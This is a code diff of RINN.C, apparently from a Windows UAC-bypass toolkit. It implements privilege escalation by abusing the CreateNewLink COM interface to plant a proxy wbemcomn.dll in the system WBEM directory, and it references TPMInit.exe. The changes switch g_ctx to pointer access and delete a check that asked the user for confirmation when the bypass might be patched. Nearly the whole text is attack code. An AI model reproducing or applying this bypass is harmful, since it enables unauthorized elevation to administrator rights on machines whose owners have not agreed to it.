@@ -4,9 +4,9 @@
 *
 *  TITLE:       RINN.C
 *
-*  VERSION:     3.00
+*  VERSION:     3.11
 *
-*  DATE:        25 Aug 2018
+*  DATE:        23 Aug 2018
 *
 *  rinn UAC bypass using CreateNewLink interface.
 *
@@ -45,7 +45,7 @@ BOOL ucmCreateNewLinkMethod(
     _In_ DWORD ProxyDllSize
 )
 {
-    BOOL                bCond = FALSE, bApprove = FALSE;
+    BOOL                bCond = FALSE;
 
     HRESULT             hr = E_UNEXPECTED, hr_init;
 
@@ -61,7 +61,7 @@ BOOL ucmCreateNewLinkMethod(
 #endif
 
 #ifndef _WIN64
-    if (g_ctx.IsWow64) {
+    if (g_ctx->IsWow64) {
         if (!NT_SUCCESS(RtlWow64EnableFsRedirectionEx((PVOID)TRUE, &OldValue)))
             return FALSE;
     }
@@ -71,23 +71,14 @@ BOOL ucmCreateNewLinkMethod(
 
     do {
 
-        //
-        // Potential fix check.
-        //
-        if (supIsConsentApprovedInterface(T_CLSID_CreateNewLink, &bApprove)) {
-            if (bApprove == FALSE)
-                if (ucmShowQuestion(UACFIX) != IDYES)
-                    break;
-        }
-
-        _strcpy(szDllPath, g_ctx.szTempDirectory);
+        _strcpy(szDllPath, g_ctx->szTempDirectory);
         _strcat(szDllPath, WBEMCOMN_DLL);
 
         l = _strlen(szDllPath);
         if (l > MAX_PATH) //CreateNewLink parameters length limited to MAX_PATH
             break;
 
-        _strcpy(szTargetPath, g_ctx.szSystemDirectory);
+        _strcpy(szTargetPath, g_ctx->szSystemDirectory);
         _strcat(szTargetPath, WBEM_DIR);
         _strcat(szTargetPath, WBEMCOMN_DLL);
 
@@ -124,7 +115,7 @@ BOOL ucmCreateNewLinkMethod(
 
             if (SUCCEEDED(hr)) {
 
-                _strcpy(szTargetPath, g_ctx.szSystemDirectory);
+                _strcpy(szTargetPath, g_ctx->szSystemDirectory);
                 _strcat(szTargetPath, TPMINIT_EXE);
 
                 //
@@ -145,7 +136,7 @@ BOOL ucmCreateNewLinkMethod(
         CreateNewLink->lpVtbl->Release(CreateNewLink);
 
 #ifndef _WIN64
-    if (g_ctx.IsWow64) {
+    if (g_ctx->IsWow64) {
         RtlWow64EnableFsRedirectionEx(OldValue, &OldValue);
     }
 #endif
